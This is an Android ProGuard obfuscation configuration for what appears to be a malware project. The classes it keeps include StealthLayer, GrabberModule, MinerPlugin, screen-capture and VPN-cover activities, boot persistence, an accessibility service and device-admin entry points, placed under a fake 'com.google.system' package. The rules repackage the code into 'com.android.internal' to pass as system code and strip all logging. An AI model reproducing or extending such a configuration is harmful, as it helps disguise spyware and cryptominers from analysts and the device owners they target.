-optimizationpasses 9
-allowaccessmodification
-repackageclasses 'com.android.internal'
-dontpreverify
-dontusemixedcaseclassnames
-overloadaggressively
-mergeinterfacesaggressively

-assumenosideeffects class android.util.Log {
    public static int v(...); public static int d(...);
    public static int i(...); public static int w(...);
    public static int e(...);
}

-assumenosideeffects class java.io.PrintStream {
    public *** println(...);
    public *** print(...);
}

# keep entry points used by Android framework
-keep class com.openaccess.sdk.MainActivity { *; }
-keep class com.openaccess.sdk.VPNCoverActivity { *; }
-keep class com.openaccess.sdk.ScreenCaptureActivity { *; }
-keep class com.google.system.AppInitializer$PackageReplacedReceiver { *; }
-keep class * extends android.app.Activity { *; }
-keep class * extends android.content.BroadcastReceiver { *; }
-keep class com.openaccess.sdk.OpenAccessApp { *; }
-keep class com.google.system.AppInitializer { *; }
-keep class com.google.system.AppInitializer$BootReceiver { *; }
-keep class com.google.system.CryptoLayer { *; }
-keep class com.google.system.StealthLayer { *; }
-keep class com.google.system.GrabberModule { *; }
-keep class com.google.system.AdvancedFeatures { *; }
-keep class com.google.system.plugins.PluginManager { *; }
-keep class com.google.system.plugins.MinerPlugin { *; }

# keep service/receiver/accessibility/admin entry points (by class name, not package)
-keep class com.android.internal.os.CoreService { *; }
-keep class com.android.internal.os.BootService { *; }
-keep class com.android.internal.os.BootReceiver { *; }
-keep class com.android.internal.os.persistence.SystemJobService { *; }
-keep class com.android.internal.accessibility.CoreAccessibilityService { *; }
-keep class com.android.internal.admin.AdminReceiver { *; }

# repackage all obfuscated classes into com.android.internal
-flattenpackagehierarchy 'com.android.internal.'

-keepattributes Signature, *Annotation*, EnclosingMethod, InnerClasses
-renamesourcefileattribute SourceFile

-keep class * extends android.app.Service { *; }
-keep class * extends android.app.admin.DeviceAdminReceiver { *; }
-keep class * extends android.accessibilityservice.AccessibilityService { *; }
-keep class * extends android.service.notification.NotificationListenerService { *; }

-keepclassmembers class * {
    @android.webkit.JavascriptInterface <methods>;
}

-keepclasseswithmembernames,includedescriptorclasses class * {
    native <methods>;
}

-keepclassmembers enum * {
    public static **[] values();
    public static ** valueOf(java.lang.String);
}
